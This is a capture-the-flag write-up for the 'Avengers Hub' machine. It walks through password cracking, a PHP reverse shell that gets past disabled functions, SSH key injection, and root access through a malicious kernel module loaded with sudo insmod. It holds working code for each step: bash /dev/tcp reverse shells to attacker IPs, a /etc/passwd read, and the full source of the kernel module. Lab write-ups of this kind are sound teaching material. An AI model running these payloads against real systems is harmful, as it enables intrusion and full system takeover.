#CTF Write-Up: Avengers Hub - Hackifinity Battle - Hard

##Step 1: Target Enumeration

The first step is to locate the target and perform an Nmap scan to check for open and hidden ports.

##Step 2: Directory and File Search

Using ffuf, we perform a directory and file search on the target. The most interesting discovery is a breakglass.zip file, which is protected by a password.

##Step 3: Cracking the ZIP File

We attempt to crack the ZIP file password using fcrackzip with the RockYou wordlist:

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt breakglass.zip

After a short while, we successfully crack the password. Inside the ZIP file, we find a hashed admin password.

##Step 4: Cracking the Admin Password

We successfully crack the hashed password, which is revealed to be: securepassword. Using this password, we gain admin access to the CMS.

##Step 5: Exploring the CMS for Exploits

We look around the CMS and find few ways to gain a reverse shell to the machine. My approach after reading about the cms is to use Droplets function that allows to inject PHP code, but after few tries we notice some php functions are disabled.
![avenger writeup1](https://github.com/user-attachments/assets/1b0d353c-f4fc-4f71-90bf-593d8658d4de)

##Step 6: Bypassing Disabled PHP Functions

However, after multiple attempts, we realize that some PHP functions are disabled. We enumerate the disabled functions using:

echo ini_get('disable_functions') . "\n";
$zmienna = file_get_contents('/etc/passwd');
echo "<pre>$zmienna</pre>";

Disabled Functions:

shell_exec, exec, passthru, system, proc_open, expect_popen

Step 7: Crafting the Reverse Shell

We bypass the restrictions by crafting a PHP reverse shell:

$ip = '10.8.26.132';
$port = 1234;
$handle = popen("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'", 'r');
pclose($handle);

Once executed, we establish a connection as www-data.

##Step 8: Gaining User Privileges

After further enumeration, we find write access to the SSH authorized keys of user Void, who owns the user.txt flag.

We inject our public SSH key, allowing us to connect as user Void:

ssh -i id_rsa void@target_ip

🎉 Now, we have user access!

##Step 9: Escalating to Root with a Kernel Module

We check for sudo permissions:

sudo -l

We discover permission to execute /sbin/insmod, which allows us to load a kernel module (.ko file).

What Are Kernel Modules?

Kernel modules (.ko files) are pieces of code that can be loaded into the Linux kernel to extend its functionality (e.g., drivers, system behavior modifications).

Since the target machine has make and kernel headers installed, we can compile a malicious kernel module directly on the target.

##Step 10: Creating the Malicious Kernel Module

We create cyberavengers.c on the target:

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define REMOTE_IP "10.20.20.20"
#define REMOTE_PORT "8888"

static int reverse_shell_thread(void *data)
{
    char *argv[] = { "/bin/bash", "-c",
        "bash -i >& /dev/tcp/" REMOTE_IP "/" REMOTE_PORT " 0>&1", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static int __init rev_init(void)
{
    printk(KERN_INFO "Reverse shell module loaded\n");
    kthread_run(reverse_shell_thread, NULL, "rev_shell");
    return 0;
}

static void __exit rev_exit(void)
{
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(rev_init);
module_exit(rev_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF Participant");
MODULE_DESCRIPTION("Kernel module reverse shell");

Creating a Makefile for Compilation

We create a Makefile:

obj-m += cyberavengers.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

##Step 11: Compile and Load the Malicious Kernel Module

1. Compile the module on the target:

make

2. Set up a listener on the attacker machine:

nc -lvnp 8888

3. Load the malicious kernel module:

sudo /sbin/insmod cyberavengers.ko

 We now have a root reverse shell on our listener!


